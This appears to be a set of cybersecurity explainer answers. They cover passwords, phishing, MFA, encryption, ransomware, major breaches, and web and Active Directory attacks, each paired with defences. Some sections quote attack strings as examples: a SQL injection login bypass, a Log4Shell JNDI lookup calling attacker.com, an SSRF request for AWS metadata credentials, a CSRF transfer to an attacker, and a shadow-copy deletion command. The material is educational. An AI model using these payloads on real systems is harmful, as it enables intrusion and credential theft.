answer: A strong password must be at least 16 characters long, combining uppercase and lowercase letters, digits, and special characters. Avoid dictionary words, names, or predictable patterns like 'P@ssw0rd'. Use a passphrase of 4+ random words (e.g., 'correct-horse-battery-staple') for both memorability and entropy. Entropy above 60 bits is recommended — this means an attacker brute-forcing at 10 billion guesses/sec would take centuries. Never reuse passwords: credential stuffing attacks automate logins with leaked password databases (e.g., from Have I Been Pwned). Use a password manager like Bitwarden or 1Password to generate and store unique credentials per site.

Phishing is a social engineering attack delivered via email, SMS (smishing), or phone (vishing) that impersonates a trusted entity to steal credentials, install malware, or extract sensitive data. Spear phishing targets specific individuals using OSINT-gathered personal details, making it far more convincing than generic campaigns. Whaling targets C-suite executives. Indicators of phishing: mismatched sender domains (e.g., 'paypa1.com'), urgency or fear-based language, unexpected password reset requests, hover-revealed suspicious URLs, and generic greetings. Defense: deploy DMARC, DKIM, and SPF email authentication records to prevent domain spoofing; enable anti-phishing browser filters; use email gateways with sandboxing (e.g., Proofpoint, Mimecast); and conduct simulated phishing exercises.

Personally Identifiable Information (PII) includes names, SSNs, email addresses, biometrics, and location data. To protect it: minimize data sharing with third parties; regularly audit app permissions on mobile devices; opt out of data broker sites; use privacy-focused search engines and browsers (Firefox + uBlock Origin); enable disk encryption; and review privacy settings on social media. Under GDPR and CCPA, you have legal rights to request deletion or correction of your data. Data minimization — only collecting what is strictly necessary — is a foundational privacy engineering principle.

Multi-factor authentication (MFA) requires two or more of: something you know (password), something you have (hardware token, authenticator app), or something you are (biometric). TOTP apps (Google Authenticator, Authy) generate time-based 6-digit codes using HMAC-SHA1 — they are significantly stronger than SMS OTPs, which are vulnerable to SIM-swapping attacks where attackers socially engineer carriers to transfer your number. The gold standard is FIDO2/WebAuthn hardware keys (YubiKey, Google Titan): they use public-key cryptography and are phishing-resistant because the key is domain-bound. Even if you lose the password, without the hardware key the account cannot be accessed. Enable MFA on all accounts, prioritizing email, cloud storage, banking, and SSO identity providers.

Encryption converts plaintext into ciphertext using a key so only authorized parties can read it. Symmetric encryption (e.g., AES-256-GCM) uses the same key to encrypt and decrypt — it is fast and used for bulk data. Asymmetric encryption (e.g., RSA-4096, Elliptic Curve) uses public/private key pairs — the public key encrypts, the private key decrypts — used for key exchange and digital signatures. TLS 1.3 combines both: asymmetric cryptography (ECDHE) for key exchange and symmetric (AES-GCM) for the session. Encryption at rest protects stored data (use full-disk encryption: BitLocker on Windows, FileVault on macOS, LUKS on Linux). Encryption in transit protects data moving over networks (enforce TLS 1.2+, disable SSL/TLS 1.0/1.1). End-to-end encryption (Signal protocol) ensures even the service provider cannot read messages.

A VPN creates an encrypted tunnel between your device and a VPN server, routing traffic through it to mask your real IP and protect data from local network eavesdroppers. Modern VPN protocols include WireGuard (fast, uses ChaCha20/Poly1305 encryption, minimal code surface) and OpenVPN (battle-tested, TLS-based). Avoid free VPNs — they often monetize your traffic. Key limitations: VPNs do not provide anonymity from the VPN provider itself; use Tor for that. Split tunneling allows routing only specific traffic through the VPN. For corporate use, zero-trust network access (ZTNA) is replacing traditional VPNs because VPNs grant broad network access once authenticated — ZTNA enforces per-resource, identity-based access controls.

Malware encompasses any software designed to harm or exploit systems: Viruses attach to legitimate files and spread when executed. Worms self-propagate across networks without user interaction. Trojans masquerade as legitimate software — often deliver payloads when executed. Spyware silently collects keystrokes, screenshots, and credentials. Adware injects unwanted ads and may track browsing. Rootkits hide at the OS kernel or bootloader level, making them extremely hard to detect and remove. Backdoors provide persistent unauthorized remote access. Defense-in-depth: use endpoint protection with behavioral detection (not just signature-based AV), enable application allowlisting, restrict admin privileges, monitor outbound network connections for C2 communication, and segment networks to limit lateral movement.

Ransomware encrypts victim files and demands payment (typically cryptocurrency) for the decryption key. Modern ransomware groups operate as Ransomware-as-a-Service (RaaS): developers build the malware and lease it to affiliates who conduct intrusions. Double extortion — exfiltrating data before encrypting it and threatening to publish it — is now standard practice (used by groups like LockBit, BlackCat/ALPHV). Attack chains typically involve: initial access via phishing or exposed RDP, privilege escalation, Active Directory compromise, lateral movement across all hosts, Shadow Copy deletion to prevent recovery (vssadmin delete shadows), and mass encryption. Defense: immutable offline backups (3-2-1 rule), network segmentation, EDR with anti-ransomware features, disabling or restricting RDP (port 3389), patch management, and disabling PowerShell/WMI for non-admin users.

Firewalls enforce access control policies on network traffic. Traditional packet-filter firewalls inspect headers only. Stateful firewalls track connection state to allow reply traffic. Next-generation firewalls (NGFWs) perform deep packet inspection (DPI), application-layer filtering, intrusion prevention (IPS), and SSL/TLS inspection. Web Application Firewalls (WAFs) protect web apps from OWASP Top 10 attacks like SQLi and XSS — they operate at Layer 7. Proper configuration: implement default-deny rules (deny all, allow explicitly); log all traffic for audit; use egress filtering to detect C2 beaconing; separate DMZ, internal, and management networks; and disable unused services and ports.

Social engineering exploits cognitive biases — authority, urgency, reciprocity, social proof — rather than technical vulnerabilities. Techniques: Pretexting (fabricating a scenario, e.g., impersonating IT support to get credentials); Baiting (leaving malware-infected USB drives in parking lots); Tailgating (physically following employees through secured doors); Quid pro quo (offering help in exchange for credentials); Vishing (phone calls impersonating banks or IT teams). The FBI IC3 reports Business Email Compromise (BEC) — a social engineering variant — caused $2.9 billion in losses in 2023 alone. Defense: implement out-of-band verification for financial transactions, conduct regular red-team social engineering simulations, enforce callback verification procedures, and train employees to resist urgency and authority manipulation.

Password managers encrypt your credential vault using AES-256 with a key derived from your master password via a slow KDF (PBKDF2, Argon2, or bcrypt) to resist brute force. Zero-knowledge architecture means the provider never sees your plaintext data. Open-source options: Bitwarden (cloud, can self-host), KeePassXC (fully local). Commercial: 1Password, Dashlane. Critical practices: use a strong, unique master password; enable MFA on the password manager itself; use the browser extension to detect phishing via URL matching; enable emergency access for account recovery. Do not store the master password itself in the vault — memorize it or store it in a physically secure location.

Public WiFi exposes you to multiple attack vectors. Evil twin attacks deploy a rogue access point with the same SSID as a legitimate network — devices auto-connect, and the attacker performs a MITM. Passive sniffing captures unencrypted HTTP traffic. ARP poisoning redirects traffic through the attacker's machine on the local network. Mitigations: always use a VPN on public networks; disable auto-connect to open WiFi; verify the exact network name with staff before connecting; prefer your phone's mobile hotspot (LTE/5G) over public WiFi for sensitive tasks; confirm HTTPS on all sites; disable WiFi when not in use; forget public networks after use to prevent auto-reconnection.

A data breach is unauthorized access to sensitive data. After a breach is confirmed: immediately change the compromised password and any accounts sharing it; enable MFA everywhere; use Have I Been Pwned (haveibeenpwned.com) to check exposed accounts; place a credit freeze with all three bureaus (Equifax, Experian, TransUnion) if financial data was exposed; monitor bank statements and credit reports; and consider identity theft protection services. Organizationally: breach response requires activating the incident response plan, preserving forensic evidence, notifying regulators within mandated windows (72 hours under GDPR, specific state laws under CCPA), and conducting a root cause analysis.

The 2017 Equifax breach exposed 147 million Americans' SSNs, birth dates, addresses, and credit card numbers. The root cause was an unpatched Apache Struts vulnerability (CVE-2017-5638) — a remote code execution flaw in the web framework. Despite a patch being available since March 2017, Equifax failed to apply it. Attackers exploited the flaw in May 2017 and remained undetected for 78 days. The attack exfiltrated data through 265 different endpoints. Lessons: patch management must be automated and enforced with SLAs; network egress filtering would have detected the data exfiltration; encryption of sensitive fields at rest limits breach impact; regular vulnerability scanning is non-negotiable.

WannaCry (May 2017) was a global cryptoworm ransomware attack attributed to North Korea's Lazarus Group. It exploited EternalBlue (MS17-010), an NSA-developed exploit for a SMBv1 vulnerability leaked by Shadow Brokers. WannaCry spread autonomously across networks without user interaction, infecting 200,000+ systems in 150 countries in hours. The UK NHS was catastrophically impacted — operations cancelled, patient records inaccessible. Microsoft had released a patch (MS17-010) in March 2017, two months prior. Security researcher Marcus Hutchins accidentally stopped the spread by registering a hardcoded kill-switch domain. Lessons: disable SMBv1; apply emergency patches immediately; segment internal networks to prevent worm propagation; maintain offline backups.

The SolarWinds attack (disclosed December 2020) was a sophisticated supply chain compromise attributed to Russian SVR (Cozy Bear/NOBELIUM). Attackers infiltrated SolarWinds' build pipeline in 2019, injecting the SUNBURST backdoor into Orion IT management software updates. 18,000+ organizations installed the trojanized updates, including US Treasury, State, and Defense departments. SUNBURST used a 2-week dormancy period to evade sandboxes, then used covert DNS-based C2 communication and blended with legitimate SolarWinds API calls to avoid detection. Defense: code signing with hardware-protected keys; reproducible builds; binary integrity verification; software bill of materials (SBOM); network monitoring for unusual DNS patterns; and zero-trust principles to limit blast radius.

HTTPS uses TLS (Transport Layer Security) to provide confidentiality, integrity, and authentication between client and server. TLS 1.3 (RFC 8446) removed weak cipher suites, mandated perfect forward secrecy (PFS) via ECDHE, and reduced handshake round-trips to 1-RTT. Certificates are issued by Certificate Authorities (CAs) — X.509 certificates bind a public key to a domain. Certificate Transparency (CT) logs allow anyone to detect misissued certificates. HSTS (HTTP Strict Transport Security) prevents SSL stripping attacks by instructing browsers to always use HTTPS. Check for: TLS version (1.2 minimum), cipher strength, HSTS header, and certificate validity at ssllabs.com. Use Let's Encrypt for free, auto-renewing TLS certificates.

SQL injection (SQLi) occurs when unsanitized user input is concatenated into SQL queries, allowing attackers to manipulate database logic. Example: a login form with query 'SELECT * FROM users WHERE username='{input}'' — inputting ' OR '1'='1 logs in without credentials. Types: in-band (error-based retrieves DB errors; union-based extracts data via UNION SELECT), blind (boolean-based and time-based infer data from true/false responses), and out-of-band (data exfiltrated via DNS/HTTP). Prevention: use parameterized queries/prepared statements exclusively (never string concatenation); employ ORMs correctly; apply input validation and allowlisting; deploy a WAF; enforce least-privilege DB accounts; and use stored procedures. Test with tools like SQLMap during penetration tests.

Cross-Site Scripting (XSS) injects malicious JavaScript into web pages viewed by other users. Reflected XSS: payload in URL parameter, reflected immediately in response — requires victim to click a crafted link. Stored XSS: payload persisted in the database (e.g., in comments) — executes for all viewers, no link needed. DOM XSS: payload manipulates the DOM via client-side JavaScript without server involvement. Impacts: session hijacking (stealing HttpOnly-flag-less cookies), credential harvesting, BeEF browser hooking, keylogging, and crypto mining. Mitigations: output encoding (HTML entity encoding) before rendering user content; Content Security Policy (CSP) headers to restrict script sources; set HttpOnly and Secure cookie flags; use DOMPurify for sanitizing HTML; avoid innerHTML in favor of textContent.

DDoS (Distributed Denial of Service) attacks overwhelm targets using botnets of thousands of compromised machines. Types: Volumetric (saturate bandwidth — UDP floods, ICMP floods, DNS amplification where a small request triggers a large response from open resolvers); Protocol attacks (exhaust stateful connection tables — SYN floods exploit the TCP 3-way handshake, consuming half-open connection buffers); Application-layer Layer 7 (HTTP floods target specific endpoints like login pages, exhausting web server resources with legitimate-looking requests). Notable botnets: Mirai exploited default-credential IoT devices. Defense: CDN/DDoS scrubbing services (Cloudflare, AWS Shield); rate limiting and connection limits; anycast routing; BGP blackholing; and over-provisioning bandwidth.

A zero-day vulnerability is a flaw unknown to the vendor or with no available patch — attackers have exploited it for 'zero days' of warning. Zero-days are sold on gray markets for hundreds of thousands to millions of dollars. Nation-state actors (NSA, FSB, Unit 8200) stockpile zero-days for espionage and sabotage. The NSA's stockpile was leaked by Shadow Brokers, resulting in EternalBlue/WannaCry. CVEs (Common Vulnerabilities and Exposures) are assigned by MITRE; CVSS scores rate severity 0-10. CISA maintains a Known Exploited Vulnerabilities (KEV) catalog. Defense-in-depth accepts you will be compromised by zero-days: focus on detection (behavioral monitoring, EDR), containment (network segmentation), and resilience (backups, IR plans). Bug bounty programs incentivize responsible disclosure.

Penetration testing methodically simulates adversarial attacks to identify exploitable vulnerabilities before malicious actors. Phases (PTES/OWASP): Reconnaissance (OSINT, subdomain enumeration, Shodan scanning); Scanning & Enumeration (Nmap, Nessus, service fingerprinting); Exploitation (Metasploit, custom exploits); Post-exploitation (privilege escalation, lateral movement, persistence); Reporting (risk-rated findings with remediation guidance). Red teaming goes further: full adversary simulation with custom C2, evasion techniques, and physical security testing, measured over weeks. Certifications: OSCP (OffSec), CEH, GPEN. Bug bounty platforms (HackerOne, Bugcrowd) allow researchers to report real-world findings. Always obtain explicit written authorization before testing — unauthorized testing is illegal under CFAA/Computer Misuse Act.

Security awareness training reduces the human attack surface — humans are involved in over 80% of breaches (Verizon DBIR). Effective programs go beyond annual click-through modules: they include simulated phishing campaigns (using tools like GoPhish or KnowBe4) to measure and train click rates; role-specific training for developers (secure coding), HR (BEC awareness), and executives (whaling); just-in-time learning (a teachable moment immediately after someone clicks a simulated phishing link); and gamified content with realistic scenarios. Track metrics: phishing click rate, reporting rate, training completion, and time-to-detect incidents. A positive security culture where employees feel safe reporting mistakes without punishment dramatically improves security posture.

The 3-2-1 backup rule: 3 copies of data, on 2 different media types, with 1 stored offsite. For ransomware resilience, add immutability: backups that cannot be modified or deleted even by admins (e.g., AWS S3 Object Lock, Veeam immutable backups, offline tape). Critical requirements: test restoration regularly — a backup you've never restored is not a backup; use encrypted backups; version backups to recover from data corruption before detection; define Recovery Time Objective (RTO: how long to restore) and Recovery Point Objective (RPO: maximum acceptable data loss). Ransomware operators now actively hunt for and delete backup systems — network-segment backup infrastructure, use separate credentials, and maintain at least one air-gapped offline copy.

Traditional signature-based antivirus compares file hashes against known malware databases — ineffective against novel and fileless malware. Modern Endpoint Detection and Response (EDR) solutions (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint) use behavioral analysis and machine learning to detect anomalous process behavior, memory injection, and living-off-the-land (LotL) techniques that abuse built-in tools like PowerShell, WMI, and certutil. Key EDR capabilities: process tree visualization, memory forensics, automated response (quarantine, process kill), threat hunting, and integration with SIEM. For individuals, Microsoft Defender (built into Windows 10/11) provides solid free protection; supplement with Malwarebytes for on-demand scanning.

Patch management closes known vulnerabilities before attackers can exploit them. The average time from CVE disclosure to active exploitation is 15 days (Qualys research). CISA's Known Exploited Vulnerabilities (KEV) catalog lists actively exploited CVEs — treat these as critical regardless of CVSS score. Best practices: enable automatic updates for OS and browsers; subscribe to vendor security advisories; prioritize by exploitability and CVSS score; test patches in staging before production; use vulnerability scanners (Nessus, OpenVAS, Qualys) for continuous discovery; track patch compliance with asset inventory tools. Microsoft releases patches on Patch Tuesday (second Tuesday of each month). In enterprises, patch SLAs should specify: critical CVEs patched within 24-48 hours, high within 7 days, medium within 30 days.

When you receive a suspicious email: do not click links — hover to inspect the actual URL; do not open attachments, especially Office documents requesting to 'Enable Macros' (macros execute VBA code used to drop malware); verify the sender's full email address, not just the display name (attackers set display names like 'IT Support' while the actual address is attacker@evil.com); check email headers for SPF/DKIM/DMARC failures; report to your security team via the official reporting mechanism (Outlook's 'Report Phishing' button or a dedicated abuse@yourdomain.com mailbox); and delete the email. If you did click a link, immediately disconnect from the network, change relevant passwords from a clean device, and notify IT security.

Biometric authentication uses physiological characteristics (fingerprint, face, iris, voice) or behavioral patterns (typing rhythm, gait). Strengths: convenience, non-repudiation, resistance to remote theft. Weaknesses: biometrics cannot be changed if compromised (unlike passwords); fingerprints can be lifted from surfaces and 3D-printed; Face ID can be fooled by 3D models without liveness detection (detecting blink, depth, warmth). Attackers use deepfake technology to bypass voice and face authentication. Modern systems implement liveness detection and anti-spoofing. Under GDPR and BIPA (Illinois Biometric Information Privacy Act), biometric data requires explicit consent and strict handling. Best practice: use biometrics as one factor in MFA, not as the sole authentication mechanism. Never store raw biometric data — store only cryptographic templates.

The dark web is accessed via Tor (The Onion Router), which anonymizes traffic by routing it through a circuit of 3+ encrypted relays — each relay knows only the previous and next hop. .onion domains are hidden services that require Tor to access. While the dark web enables legitimate uses (journalists, activists in authoritarian regimes, whistleblowers — e.g., SecureDrop), it also hosts criminal markets selling stolen credentials, RDP access to compromised servers, malware kits, and drugs. Breached credentials appear on paste sites and dark web forums. Monitor your exposure with services like Have I Been Pwned, SpyCloud, or enterprise dark web monitoring. Tor does not make you anonymous if you log into personal accounts, use Flash/JavaScript, or download files that call home.

Cryptocurrency security hinges on private key management. Your keys = your coins; if the private key is compromised or lost, funds are irrecoverable. Hardware wallets (Ledger, Trezor) store private keys in a secure element chip, signing transactions offline — the key never touches an internet-connected device. Exchanges (Mt. Gox, Bitfinex, FTX) hold your private keys for you, exposing you to exchange insolvency and hacks. Best practices: use a hardware wallet for significant holdings; generate seed phrases (BIP-39, typically 12-24 words) offline; store seed phrases in fireproof metal plates in physically secure locations — never digitally photograph them; enable IP allowlisting and withdrawal address whitelisting on exchanges; use separate email and MFA (hardware key) for exchange accounts; beware of clipboard hijacking malware that replaces copied wallet addresses.

IoT devices (cameras, routers, thermostats, smart locks) run embedded Linux or RTOS with minimal security controls. Common vulnerabilities: default credentials (admin/admin, admin/password) — searchable on Shodan; unencrypted protocols (Telnet, HTTP); no automatic updates; exposed management interfaces; hard-coded credentials in firmware; and memory safety issues (buffer overflows). Mirai and its variants compromised millions of devices using default credentials to build botnets used in record-breaking DDoS attacks. Defense: change default credentials immediately; update firmware; disable UPnP, Telnet, and remote admin; place IoT devices on an isolated VLAN with no lateral access to your main network; use your router's firewall to block inbound connections to IoT devices; regularly audit what devices are on your network with tools like Fing.

Mobile threats include: malicious apps (from unofficial sources or disguised as legitimate apps); spyware (Pegasus NSO Group spyware targeted journalists via iMessage zero-click exploits); juice jacking (malicious USB charging stations that install malware or exfiltrate data via USB data lines — carry a USB data blocker or use AC charging only); SIM swapping; and insecure app data storage (credentials stored in unencrypted SharedPreferences or NSUserDefaults). Defense: install apps only from official app stores; review permissions granularly (deny location/camera/microphone unless needed); keep OS updated; enable remote wipe (Find My iPhone, Android Device Manager); use a screen lock with biometrics + PIN; avoid jailbreaking/rooting (disables security sandboxes); and use MDM solutions in enterprise environments for policy enforcement and remote wipe.

The Principle of Least Privilege (PoLP) grants users and systems only the minimum permissions needed to perform their function. Over-privileged accounts are a primary attack amplifier — if an attacker compromises a domain admin account, they own everything. Implementations: Role-Based Access Control (RBAC) assigns permissions to roles, not individuals; Attribute-Based Access Control (ABAC) adds contextual conditions; Privileged Access Management (PAM) solutions (CyberArk, BeyondTrust) vault admin credentials, require approval for privileged sessions, and record all privileged activity. Just-in-time (JIT) access grants elevated permissions only when needed and automatically revokes them. Conduct quarterly access reviews — revoke permissions for inactive accounts, former employees, and over-provisioned roles. Separate privileged admin accounts from daily-use accounts.

Incident Response (IR) follows the NIST SP 800-61 lifecycle: 1) Preparation — IR plan, playbooks, tooling (SIEM, EDR), tabletop exercises; 2) Detection & Analysis — identify indicators of compromise (IoCs), triage severity, determine scope using log analysis and memory forensics; 3) Containment — isolate affected systems (network isolation, account lockout) while preserving evidence; 4) Eradication — remove malware, close access vectors, patch vulnerabilities; 5) Recovery — restore from clean backups, monitor for re-infection; 6) Post-Incident — document timeline, root cause, and lessons learned; update IR plan. Digital forensics (DFIR) involves collecting volatile evidence first (RAM, running processes, network connections), then disk images, maintaining chain of custody for legal proceedings. Engage legal counsel early in breach scenarios due to notification obligations.

Security audits evaluate security posture against frameworks and regulations. Key frameworks: ISO 27001 (international standard for Information Security Management Systems, requires certification audit); SOC 2 (AICPA standard assessing Trust Services Criteria: security, availability, confidentiality, processing integrity, privacy — Type II covers a 6-12 month period); PCI DSS (required for any organization handling payment card data — 12 requirements covering network security, encryption, access control, and monitoring); NIST Cybersecurity Framework (Identify, Protect, Detect, Respond, Recover — widely used by US federal agencies); HIPAA (healthcare PHI protection in the US); GDPR (EU data protection — fines up to 4% of global annual revenue). Audits can be internal (gap assessments) or external (certification bodies). Continuous compliance monitoring with GRC platforms (Vanta, Drata, Tugboat Logic) automates evidence collection.

Advanced Persistent Threats (APTs) are long-duration, stealthy intrusions typically conducted by nation-state actors or their proxies for espionage, sabotage, or financial gain. Unlike opportunistic attackers, APTs perform extensive reconnaissance, develop or purchase custom implants, and maintain persistence for months or years undetected — the average dwell time before detection is 197 days (Mandiant). Notable APT groups: APT28/Fancy Bear (Russian GRU — DNC hack, NotPetya); APT29/Cozy Bear (Russian SVR — SolarWinds, COVID vaccine research); Lazarus Group (North Korea — WannaCry, $600M Ronin Bridge crypto theft); APT41 (Chinese — dual espionage and financial crime). Tactics from the MITRE ATT&CK framework include spearphishing, supply chain compromise, living-off-the-land, and low-and-slow data exfiltration via covert channels. Detection requires behavioral analytics, threat hunting, and deception technology (honeypots).

Man-in-the-Middle (MITM) attacks position the attacker between two communicating parties, intercepting, reading, or modifying traffic without either party's awareness. Techniques: ARP Poisoning (sending forged ARP replies on a LAN to associate the attacker's MAC with the victim's IP, redirecting traffic through the attacker — tools: Ettercap, arpspoof); SSL Stripping (downgrades HTTPS to HTTP using tools like sslstrip, intercepting plaintext credentials — defeated by HSTS preloading); BGP Hijacking (announcing false BGP routes at the ISP level to redirect internet-scale traffic); DNS Spoofing (poisoning DNS caches with false records); Evil Twin (rogue WiFi AP). Defenses: HSTS preloading; mutual TLS (mTLS); certificate pinning; DAI (Dynamic ARP Inspection) on managed switches; DNSSEC for DNS integrity; VPNs on untrusted networks.

DNS poisoning/spoofing injects fraudulent DNS records into a resolver's cache, redirecting users from legitimate domains to attacker-controlled IP addresses — without the user's knowledge. Cache poisoning exploits the lack of transaction ID randomization (Kaminsky attack, 2008 — affected virtually all DNS resolvers). DNS hijacking can occur at the ISP level, router level (malware modifying router DNS settings), or registrar level (hijacking DNS NS records via compromised registrar accounts). Defenses: DNSSEC (cryptographically signs DNS records — resolvers validate signatures before accepting records); DNS over HTTPS (DoH) or DNS over TLS (DoT) encrypts DNS queries to prevent eavesdropping and tampering in transit; use trusted resolvers (1.1.1.1 Cloudflare, 8.8.8.8 Google, 9.9.9.9 Quad9 with malware blocking); enable 2FA on domain registrar accounts; monitor DNS records for unauthorized changes.

Cross-Site Request Forgery (CSRF) tricks authenticated users into unknowingly submitting requests to a web application — exploiting the fact that browsers automatically send cookies with every request to a domain. Example: a victim visits malicious-site.com which contains an hidden form POSTing to bank.com/transfer?amount=10000&to=attacker — if the victim is logged into bank.com, their session cookie is sent automatically, executing the transfer. Mitigations: CSRF tokens (unique, unpredictable values embedded in forms and validated server-side); SameSite cookie attribute set to Strict or Lax (prevents cross-origin cookie sending); Referer/Origin header validation; custom request headers (X-Requested-With: XMLHttpRequest — cross-origin requests cannot set custom headers). CSRF only works against state-changing requests and is ineffective if CORS is properly configured or if the site uses SameSite=Strict cookies.

Buffer overflow attacks write data beyond the bounds of a fixed-size buffer in memory, corrupting adjacent memory — including saved return addresses on the stack. Classic stack smashing: overwrite the return address with the address of attacker-controlled shellcode to redirect execution. Heap overflows corrupt heap metadata or adjacent heap objects. Exploit mitigations: ASLR (Address Space Layout Randomization — randomizes base addresses of stack, heap, libraries, making gadget addresses unpredictable); NX/DEP (Non-Executable stack/Data Execution Prevention — prevents code execution in data regions); Stack Canaries (place a random value before the return address — detected if overwritten before function return); SafeStack and Shadow Stack (hardware-enforced CFI). Return-Oriented Programming (ROP) chains small existing code snippets ('gadgets') to bypass NX. Use memory-safe languages (Rust, Go) for new systems code. Enable compiler hardening flags: -fstack-protector-strong, -D_FORTIFY_SOURCE=2, -pie, -Wl,-z,relro.

Log4Shell (CVE-2021-44228, December 2021, CVSS 10.0) is a critical remote code execution vulnerability in Apache Log4j 2, a Java logging library used by millions of applications including VMware, Apple iCloud, Minecraft, and countless enterprise products. The vulnerability: Log4j supports lookup substitutions in log messages — if a log message contained a string like ${jndi:ldap://attacker.com/exploit}, Log4j would make an outbound LDAP request and load a remote Java class, executing arbitrary code. Simply sending the payload in any logged field (User-Agent, username, X-Forwarded-For) triggered RCE. Exploitation began within hours of disclosure. Defense at the time: patch to Log4j 2.16+ (disabled JNDI lookups by default); network-level mitigation: block outbound LDAP/RMI connections from servers; set -Dlog4j2.formatMsgNoLookups=true JVM flag; WAF rules to detect JNDI payload patterns. Lesson: audit all software dependencies with an SBOM (Software Bill of Materials).

Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests to unintended destinations — including internal network resources or cloud metadata endpoints not accessible from the internet. Example: a URL-fetching feature at fetch?url= that accepts attacker-supplied URLs. The attacker submits fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role to access AWS Instance Metadata Service (IMDS) and steal IAM credentials — a technique that enabled the Capital One breach (2019), exposing 100 million records. SSRF can pivot to scan internal services, access localhost admin interfaces, read cloud metadata, or exploit SSRF-to-RCE chains. Mitigations: validate and allowlist target URLs/IPs/hostnames; block requests to private IP ranges (127.x, 10.x, 172.16-31.x, 192.168.x) and cloud metadata endpoints; use IMDSv2 (requires token-based sessions for AWS metadata); deploy a server-side URL fetching proxy with strict allowlisting; disable unnecessary URL-fetching features.

Pass-the-Hash (PtH) is a lateral movement technique where an attacker captures NTLM password hashes from memory (using tools like Mimikatz or secretsdump.py from Impacket) and uses them directly to authenticate to other systems — without knowing the plaintext password. NTLM authentication accepts the hash as proof of identity. Mimikatz extracts hashes from lsass.exe (the Windows Local Security Authority process) in memory, including cleartext credentials cached by WDigest. Defenses: disable NTLM authentication where possible (enforce Kerberos); enable Windows Defender Credential Guard (virtualizes lsass, preventing memory extraction); protect lsass with PPL (Protected Process Light); disable WDigest caching (HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest: UseLogonCredential=0); implement tiered admin model (separate admin accounts per tier — never log into workstations with domain admin credentials); deploy Microsoft LAPS for unique local admin passwords per machine.

Kerberoasting is an Active Directory attack that extracts Kerberos service tickets for offline password cracking. Any authenticated domain user can request a Ticket Granting Service (TGS) ticket for any service account with a Service Principal Name (SPN). The TGS ticket is encrypted with the service account's NTLM hash — the attacker requests tickets for all SPNs, saves them locally, and cracks them offline using Hashcat against wordlists. Service accounts often have weak passwords and excessive privileges (sometimes Domain Admin), making this extremely impactful. The attack generates no alerts in default AD configurations. Defenses: enforce long (25+ characters), random passwords on service accounts; use Group Managed Service Accounts (gMSA — AD automatically rotates 240-character random passwords); monitor for TGS requests for multiple SPNs from a single account; audit service accounts for unnecessary privileges; consider deploying honeypot SPN accounts to detect Kerberoasting.

The Golden Ticket attack forges Kerberos Ticket Granting Tickets (TGTs) by using the krbtgt account's NTLM hash — obtained from a Domain Controller during post-exploitation. With the krbtgt hash, an attacker can generate valid TGTs for any user, with any group memberships, valid for any duration (even 10 years), completely offline. This provides persistent, near-undetectable domain-wide access, even after password resets (because the forged ticket doesn't query AD for validation). Detection is extremely difficult as the tickets appear valid. Remediation requires resetting the krbtgt password TWICE (to invalidate all existing tickets, including Kerberos's forward-cached copy) and hunting for all compromised systems. Silver Tickets target individual services using the service account's hash rather than krbtgt — more limited scope but harder to detect since they never contact the KDC. Protecting DCs: restrict DC access to tier-0 admins only; monitor for anomalous Kerberos ticket lifetimes and privileged account logins.

Container security addresses risks across the container lifecycle. Image security: build from minimal base images (distroless, Alpine); scan images for CVEs with tools like Trivy, Grype, or Snyk; sign images with Sigstore/cosign; use image allowlisting in registries. Runtime security: never run containers as root (specify a non-root user in Dockerfile); avoid privileged mode (--privileged grants near-host-root access); use read-only root filesystems; drop unnecessary Linux capabilities; implement seccomp profiles to restrict syscalls; use AppArmor/SELinux profiles. Kubernetes-specific: use Pod Security Admission (enforce Restricted policy); implement RBAC with minimal permissions; protect the Kubernetes API server (disable anonymous auth, use OIDC); audit etcd access (stores all cluster state unencrypted by default); use NetworkPolicies to restrict pod-to-pod communication; scan with kube-bench (CIS Kubernetes Benchmark).

Cloud security operates under the Shared Responsibility Model: the cloud provider secures the infrastructure; the customer secures their data, identity, and configurations. The most common cloud breaches are misconfigurations, not provider breaches. Common AWS misconfigurations: public S3 buckets (billions of records exposed over the years — Capital One, GrayKey); overly permissive IAM roles (excessive * permissions); exposed EC2 metadata service (SSRF to IMDSv1 — use IMDSv2); unrestricted security groups (0.0.0.0/0 on port 22 or 3389); unencrypted EBS volumes and snapshots made public; no CloudTrail logging. Defenses: use Cloud Security Posture Management (CSPM) tools (AWS Security Hub, Prisma Cloud, Wiz, Orca) for continuous misconfiguration detection; enforce least-privilege IAM with permission boundaries; enable MFA delete on S3; use AWS Config rules for compliance; implement SCPs (Service Control Policies) to enforce guardrails across all accounts in AWS Organizations.

API security is critical as APIs are now the primary attack surface for web applications. OWASP API Security Top 10 highlights the most common API flaws: Broken Object Level Authorization (BOLA/IDOR — API returns data for any object ID without verifying ownership, e.g., GET /api/accounts/1234 — change to 1235 for another user's data); Broken Authentication (missing rate limiting on login endpoints enables credential stuffing; weak JWT secrets or missing signature validation); Excessive Data Exposure (APIs returning full objects when only a subset is needed — applications filter client-side, bypassed by direct API calls); Security Misconfiguration (verbose error messages, CORS wildcard, missing TLS); Injection (SQLi, NoSQLi, command injection via API parameters). Defenses: implement object ownership checks on every request; use OAuth 2.0 with short-lived access tokens; rate-limit all endpoints; log all API calls; use an API gateway; conduct API-specific penetration tests; implement schema validation to reject unexpected fields.

JSON Web Tokens (JWTs) are base64url-encoded signed tokens (header.payload.signature) used for stateless authentication. Critical JWT vulnerabilities: Algorithm Confusion (changing alg header to 'none' — some libraries accept unsigned tokens; or switching from RS256 to HS256 and signing with the public key as the HMAC secret); Weak Secret (HMAC-SHA256 keys can be brute-forced offline if the secret is short or common — crackable with hashcat -m 16500); JWT header injection (jku/x5u parameters instructing the server to fetch the public key from an attacker-controlled URL); Missing validation (not verifying the signature at all — accepting any payload). Defense: use robust libraries; pin the expected algorithm server-side (never accept client-specified algorithms); use RSA-4096 or ECDSA with secure key management; set short expiration times (exp claim); implement token revocation via a denylist or short-lived refresh token rotation; never store sensitive data in JWT payload (it is only encoded, not encrypted — use JWE for encrypted tokens).

